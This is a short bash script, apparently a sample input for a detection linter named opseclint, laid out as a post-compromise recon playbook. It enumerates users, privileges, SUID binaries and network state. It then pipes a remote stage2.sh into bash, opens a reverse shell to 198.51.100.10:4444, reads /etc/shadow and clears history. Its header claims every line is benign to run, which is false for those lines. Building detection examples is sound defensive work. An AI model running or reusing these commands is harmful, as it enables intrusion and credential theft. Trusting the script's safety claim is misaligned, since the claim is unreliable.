#!/bin/bash
# Sample post-compromise recon playbook. Used to demonstrate opseclint.
# Every line here is benign to *run* in a lab; the point is to show what a
# defender's telemetry would light up with.

whoami
id
uname -a
cat /etc/os-release

# Account & privilege enumeration
cat /etc/passwd
sudo -l
find / -perm -4000 -type f 2>/dev/null

# Network posture
ip addr
ss -tulpn
arp -a

# The loud stuff
curl http://198.51.100.10/stage2.sh | bash
bash -i >& /dev/tcp/198.51.100.10/4444 0>&1
cat /etc/shadow
history -c
